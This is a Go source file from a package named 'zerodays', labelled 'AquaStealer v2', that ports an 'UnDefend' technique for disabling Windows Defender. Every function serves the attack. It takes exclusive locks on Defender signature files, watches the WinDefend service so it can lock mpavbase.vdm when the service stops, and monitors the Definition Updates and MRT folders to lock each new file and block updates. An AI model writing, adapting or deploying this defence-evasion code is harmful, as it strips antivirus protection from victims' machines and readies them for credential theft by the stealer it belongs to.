package zerodays

// undefend.go — AquaStealer v2
// Go port of UnDefend 0day (nightmare-eclipse)
//
// Técnicas:
//   1. WDKillerThread  — monitorea el servicio WinDefend via NotifyServiceStatusChange;
//      cuando WD se detiene, bloquea mpavbase.vdm con NtCreateFile+LockFileEx exclusive
//   2. MRTWorkerThread — monitorea C:\Windows\System32\MRT con ReadDirectoryChangesW;
//      bloquea cada archivo que aparezca (impide que MRT se actualice)
//   3. UpdateBlockerThread — bloquea archivos individuales del dir Definition Updates
//   4. TryLockBackup — intenta bloquear mpavbase.lkg y mpavbase.vdm en el dir Backup
//      inmediatamente al inicio
//   5. MainUnDefend — todo lo anterior coordinado en goroutines

import (
	"path/filepath"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

var (
	_kernel32ud = syscall.NewLazyDLL("kernel32.dll")
	_ntdllud    = syscall.NewLazyDLL("ntdll.dll")
	_advapi32ud = syscall.NewLazyDLL("advapi32.dll")

	_NtCreateFileUD              = _ntdllud.NewProc("NtCreateFile")
	_RtlInitUnicodeStringUD      = _ntdllud.NewProc("RtlInitUnicodeString")
	_NtCloseUD                   = _ntdllud.NewProc("NtClose")
	_LockFileExUD                = _kernel32ud.NewProc("LockFileEx")
	_LockFileUD                  = _kernel32ud.NewProc("LockFile")
	_GetFileSizeExUD             = _kernel32ud.NewProc("GetFileSizeEx")
	_ReadDirectoryChangesWUD     = _kernel32ud.NewProc("ReadDirectoryChangesW")
	_OpenSCManagerWUD            = _advapi32ud.NewProc("OpenSCManagerW")
	_OpenServiceWUD              = _advapi32ud.NewProc("OpenServiceW")
	_QueryServiceStatusUD        = _advapi32ud.NewProc("QueryServiceStatus")
	_NotifyServiceStatusChangeUD = _advapi32ud.NewProc("NotifyServiceStatusChangeW")
	_CloseServiceHandleUD        = _advapi32ud.NewProc("CloseServiceHandle")
)

// --- NT types ---

type udUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type udObjectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *udUnicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type udIOStatusBlock struct {
	Status      uintptr
	Information uintptr
}

type udServiceStatus struct {
	ServiceType             uint32
	CurrentState            uint32
	ControlsAccepted        uint32
	Win32ExitCode           uint32
	ServiceSpecificExitCode uint32
	CheckPoint              uint32
	WaitHint                uint32
}

const (
	udOBJ_CASE_INSENSITIVE      = 0x00000040
	udFILE_NON_DIRECTORY_FILE   = 0x00000040
	udFILE_DIRECTORY_FILE       = 0x00000001
	udFILE_SYNCHRONOUS_IO_ALERT = 0x00000010
	udFILE_SYNCHRONOUS_IO_NONALERT = 0x00000020
	udFILE_OPEN_REPARSE_POINT   = 0x00200000
	udFILE_OPEN                 = 3
	udFILE_READ_DATA            = 0x00000001
	udLOCKFILE_EXCLUSIVE_LOCK   = 0x00000002
	udSERVICE_RUNNING           = 4
	udSC_MANAGER_CONNECT        = 0x0001
	udSERVICE_QUERY_STATUS      = 0x0004
	udSERVICE_QUERY_CONFIG      = 0x0001
	udSERVICE_NOTIFY_STOPPED    = 0x00000001
	udSERVICE_NOTIFY_STATUS_CHANGE = 2

	udFILE_NOTIFY_CHANGE_SIZE = 0x00000008
	udFILE_ACTION_MODIFIED    = 3

	udSTATUS_NOT_FOUND                = uintptr(0xC0000225)
	udSTATUS_OBJECT_NAME_NOT_FOUND    = uintptr(0xC0000034)
	udSTATUS_OBJECT_PATH_NOT_FOUND    = uintptr(0xC000003A)
)

// globalHandles keeps all lock handles alive forever
var (
	udHandleMu sync.Mutex
	udHandles  []syscall.Handle
)

func udAddHandle(h syscall.Handle) {
	udHandleMu.Lock()
	udHandles = append(udHandles, h)
	udHandleMu.Unlock()
}

// udRtlInitUnicodeString fills a UNICODE_STRING from a Go string (UTF-16)
func udRtlInitUnicodeString(us *udUnicodeString, s string) {
	buf, _ := syscall.UTF16PtrFromString(s)
	_RtlInitUnicodeStringUD.Call(
		uintptr(unsafe.Pointer(us)),
		uintptr(unsafe.Pointer(buf)),
	)
}

// udNtCreateFileOpen opens a file using the NT namespace (\??\...)
func udNtCreateFileOpen(ntPath string, access uint32, shareMode uint32, createDisp uint32, createOpts uint32) (syscall.Handle, uintptr) {
	buf, _ := syscall.UTF16PtrFromString(ntPath)
	var us udUnicodeString
	_RtlInitUnicodeStringUD.Call(
		uintptr(unsafe.Pointer(&us)),
		uintptr(unsafe.Pointer(buf)),
	)
	var oa udObjectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &us
	oa.Attributes = udOBJ_CASE_INSENSITIVE

	var iostat udIOStatusBlock
	var handle uintptr

	r, _, _ := _NtCreateFileUD.Call(
		uintptr(unsafe.Pointer(&handle)),
		uintptr(access),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&iostat)),
		0, // AllocationSize
		0x80, // FILE_ATTRIBUTE_NORMAL
		uintptr(shareMode),
		uintptr(createDisp),
		uintptr(createOpts),
		0,
		0,
	)
	return syscall.Handle(handle), r
}

// udLockFileFull locks the entire file exclusively
func udLockFileFull(h syscall.Handle) bool {
	var sz [8]byte // LARGE_INTEGER
	r, _, _ := _GetFileSizeExUD.Call(uintptr(h), uintptr(unsafe.Pointer(&sz[0])))
	if r == 0 {
		return false
	}
	// OVERLAPPED with zeroes = offset 0
	var ov [20]byte // OVERLAPPED
	r, _, _ = _LockFileExUD.Call(
		uintptr(h),
		udLOCKFILE_EXCLUSIVE_LOCK,
		0,
		uintptr(*(*uint32)(unsafe.Pointer(&sz[0]))),
		uintptr(*(*uint32)(unsafe.Pointer(&sz[4]))),
		uintptr(unsafe.Pointer(&ov[0])),
	)
	return r != 0
}

// udTryLockBackup — bloquea mpavbase.lkg y mpavbase.vdm en Backup al inicio
func udTryLockBackup(wdUpdateDir string) {
	files := []string{
		filepath.Join(wdUpdateDir, "Backup", "mpavbase.lkg"),
		filepath.Join(wdUpdateDir, "Backup", "mpavbase.vdm"),
	}
	for _, f := range files {
		ntPath := `\??\` + f
		h, stat := udNtCreateFileOpen(
			ntPath,
			0x80000000|0x20000000|0x00100000, // GENERIC_READ|GENERIC_EXECUTE|SYNCHRONIZE
			0,
			udFILE_OPEN,
			udFILE_NON_DIRECTORY_FILE|udFILE_SYNCHRONOUS_IO_ALERT,
		)
		if stat == 0 && h != 0 {
			udLockFileFull(h)
			udAddHandle(h)
		}
	}
}

// udUpdateBlockerThread — bloquea un archivo específico en el dir Definition Updates
// Runs in a goroutine; retries until file exists
func udUpdateBlockerThread(fullPath string) {
	ntPath := `\??\` + fullPath
	var h syscall.Handle
	var stat uintptr
	for {
		h, stat = udNtCreateFileOpen(
			ntPath,
			0x80000000|0x00100000, // GENERIC_READ|SYNCHRONIZE
			0x40000000|0x80000000, // FILE_SHARE_WRITE|FILE_SHARE_DELETE
			udFILE_OPEN,
			udFILE_NON_DIRECTORY_FILE,
		)
		if stat == udSTATUS_NOT_FOUND || stat == udSTATUS_OBJECT_NAME_NOT_FOUND || stat == udSTATUS_OBJECT_PATH_NOT_FOUND {
			return
		}
		if stat == 0 {
			break
		}
	}

	var sz [8]byte // LARGE_INTEGER
	_GetFileSizeExUD.Call(uintptr(h), uintptr(unsafe.Pointer(&sz[0])))

	_LockFileUD.Call(
		uintptr(h),
		0, 0,
		uintptr(*(*uint32)(unsafe.Pointer(&sz[0]))),
		uintptr(*(*uint32)(unsafe.Pointer(&sz[4]))),
	)
	udAddHandle(h)
}

// udWDUpdateDirMonitor — monitorea el dir Definition Updates y bloquea cada nuevo archivo
func udWDUpdateDirMonitor(wdUpdateDir string) {
	ntDir := `\??\` + wdUpdateDir
	hDir, stat := udNtCreateFileOpen(
		ntDir,
		udFILE_READ_DATA|0x00100000, // +SYNCHRONIZE
		0x00000001|0x00000002|0x00000004, // FILE_SHARE_READ|WRITE|DELETE
		udFILE_OPEN,
		udFILE_DIRECTORY_FILE|udFILE_SYNCHRONOUS_IO_NONALERT|udFILE_OPEN_REPARSE_POINT,
	)
	if stat != 0 || hDir == 0 {
		return
	}

	notifyBuf := make([]byte, 0x1000)
	for {
		var retBytes uint32
		r, _, _ := _ReadDirectoryChangesWUD.Call(
			uintptr(hDir),
			uintptr(unsafe.Pointer(&notifyBuf[0])),
			uintptr(len(notifyBuf)),
			1, // watchSubtree
			udFILE_NOTIFY_CHANGE_SIZE,
			uintptr(unsafe.Pointer(&retBytes)),
			0, // no OVERLAPPED (sync)
			0,
		)
		if r == 0 {
			break
		}
		// parse FILE_NOTIFY_INFORMATION
		offset := 0
		for {
			action := *(*uint32)(unsafe.Pointer(&notifyBuf[offset+4]))
			fileNameLen := *(*uint32)(unsafe.Pointer(&notifyBuf[offset+8]))
			if action == udFILE_ACTION_MODIFIED && fileNameLen > 0 {
				nameBytes := notifyBuf[offset+12 : offset+12+int(fileNameLen)]
				nameBuf := make([]uint16, fileNameLen/2)
				for i := range nameBuf {
					nameBuf[i] = *(*uint16)(unsafe.Pointer(&nameBytes[i*2]))
				}
				name := syscall.UTF16ToString(nameBuf)
				fullPath := filepath.Join(wdUpdateDir, name)
				go udUpdateBlockerThread(fullPath)
			}
			nextOffset := *(*uint32)(unsafe.Pointer(&notifyBuf[offset]))
			if nextOffset == 0 {
				break
			}
			offset += int(nextOffset)
		}
	}
	syscall.CloseHandle(hDir)
}

// udMRTWorkerThread — monitorea C:\Windows\System32\MRT y bloquea sus archivos
func udMRTWorkerThread() {
	mrtDir := `\??\C:\Windows\System32\MRT`
	var hDir syscall.Handle
	var stat uintptr
	for {
		hDir, stat = udNtCreateFileOpen(
			mrtDir,
			udFILE_READ_DATA|0x00100000,
			0x00000001|0x00000002|0x00000004,
			udFILE_OPEN,
			udFILE_DIRECTORY_FILE|udFILE_SYNCHRONOUS_IO_NONALERT|udFILE_OPEN_REPARSE_POINT,
		)
		if stat == 0 && hDir != 0 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}

	notifyBuf := make([]byte, 0x1000)
	for {
		var retBytes uint32
		r, _, _ := _ReadDirectoryChangesWUD.Call(
			uintptr(hDir),
			uintptr(unsafe.Pointer(&notifyBuf[0])),
			uintptr(len(notifyBuf)),
			1,
			udFILE_NOTIFY_CHANGE_SIZE,
			uintptr(unsafe.Pointer(&retBytes)),
			0,
			0,
		)
		if r == 0 {
			break
		}
		offset := 0
		for {
			action := *(*uint32)(unsafe.Pointer(&notifyBuf[offset+4]))
			fileNameLen := *(*uint32)(unsafe.Pointer(&notifyBuf[offset+8]))
			if action == udFILE_ACTION_MODIFIED && fileNameLen > 0 {
				nameBytes := notifyBuf[offset+12 : offset+12+int(fileNameLen)]
				nameBuf := make([]uint16, fileNameLen/2)
				for i := range nameBuf {
					nameBuf[i] = *(*uint16)(unsafe.Pointer(&nameBytes[i*2]))
				}
				name := syscall.UTF16ToString(nameBuf)
				fullPath := `C:\Windows\System32\MRT\` + name
				go udUpdateBlockerThread(fullPath)
			}
			nextOffset := *(*uint32)(unsafe.Pointer(&notifyBuf[offset]))
			if nextOffset == 0 {
				break
			}
			offset += int(nextOffset)
		}
	}
	syscall.CloseHandle(hDir)
}

// udWDKillerCallback — cuando WinDefend se detiene, bloquea mpavbase.vdm
func udWDKillerCallback() {
	// Leer SignatureLocation del registry
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows Defender\Signature Updates`,
		registry.QUERY_VALUE)
	if err != nil {
		// Fallback hardcoded
		k2, err2 := registry.OpenKey(registry.LOCAL_MACHINE,
			`SOFTWARE\Microsoft\Windows Defender`,
			registry.QUERY_VALUE)
		if err2 != nil {
			return
		}
		defer k2.Close()
		// try ProductAppDataPath
		appdata, _, _ := k2.GetStringValue("ProductAppDataPath")
		if appdata == "" {
			return
		}
		paths := []string{
			filepath.Join(appdata, "Definition Updates", "mpavbase.vdm"),
			`C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Default\mpavbase.vdm`,
		}
		for _, p := range paths {
			h, stat := udNtCreateFileOpen(
				`\??\`+p,
				0x80000000|0x20000000|0x00100000,
				0,
				udFILE_OPEN,
				udFILE_NON_DIRECTORY_FILE|udFILE_SYNCHRONOUS_IO_ALERT,
			)
			if stat == 0 && h != 0 {
				udLockFileFull(h)
				udAddHandle(h)
				return
			}
		}
		return
	}
	defer k.Close()

	sigPath, _, err := k.GetStringValue("SignatureLocation")
	if err != nil {
		sigPath = `C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Default`
	}
	vdmPath := filepath.Join(sigPath, "mpavbase.vdm")
	ntPath := `\??\` + vdmPath

	h, stat := udNtCreateFileOpen(
		ntPath,
		0x80000000|0x20000000|0x00100000,
		0,
		udFILE_OPEN,
		udFILE_NON_DIRECTORY_FILE|udFILE_SYNCHRONOUS_IO_ALERT,
	)
	if stat != 0 || h == 0 {
		return
	}
	udLockFileFull(h)
	udAddHandle(h)
}

// udWDKillerMonitor — espera a que WinDefend se detenga via polling (Go no tiene NotifyServiceStatusChange fácil)
// Usa polling cada 2s como alternativa confiable
func udWDKillerMonitor() {
	scm, _, _ := _OpenSCManagerWUD.Call(0, 0, udSC_MANAGER_CONNECT)
	if scm == 0 {
		return
	}
	defer _CloseServiceHandleUD.Call(scm)

	svcName, _ := syscall.UTF16PtrFromString("WinDefend")
	hsvc, _, _ := _OpenServiceWUD.Call(scm, uintptr(unsafe.Pointer(svcName)),
		udSERVICE_QUERY_STATUS|udSERVICE_QUERY_CONFIG)
	if hsvc == 0 {
		return
	}
	defer _CloseServiceHandleUD.Call(hsvc)

	wasRunning := false
	for {
		var svcStatus udServiceStatus
		r, _, _ := _QueryServiceStatusUD.Call(hsvc, uintptr(unsafe.Pointer(&svcStatus)))
		if r == 0 {
			break
		}
		if svcStatus.CurrentState == udSERVICE_RUNNING {
			wasRunning = true
		} else if wasRunning && svcStatus.CurrentState != udSERVICE_RUNNING {
			// WD acaba de detenerse — ejecutar callback
			go udWDKillerCallback()
			wasRunning = false
		}
		time.Sleep(2000 * time.Millisecond)
	}
}

// RunUnDefend — punto de entrada principal, lanza todo en goroutines
// Equivalente al wmain() de UnDefend.cpp
func RunUnDefend() {
	// Obtener WD update dir
	wdUpdateDir := getWDUpdateDir()

	// 1. Intentar bloquear archivos Backup inmediatamente
	if wdUpdateDir != "" {
		go udTryLockBackup(wdUpdateDir)
	}

	// 2. Monitorear WinDefend service (si se detiene, bloquear mpavbase.vdm)
	go udWDKillerMonitor()

	// 3. Monitorear Definition Updates dir
	if wdUpdateDir != "" {
		go udWDUpdateDirMonitor(wdUpdateDir)
	}

	// 4. Monitorear MRT dir
	go udMRTWorkerThread()
}

// getWDUpdateDir lee la ruta de Definition Updates desde el registry
func getWDUpdateDir() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows Defender`,
		registry.QUERY_VALUE)
	if err != nil {
		return `C:\ProgramData\Microsoft\Windows Defender\Definition Updates`
	}
	defer k.Close()

	appdata, _, err := k.GetStringValue("ProductAppDataPath")
	if err != nil || appdata == "" {
		return `C:\ProgramData\Microsoft\Windows Defender\Definition Updates`
	}
	return filepath.Join(appdata, "Definition Updates")
}
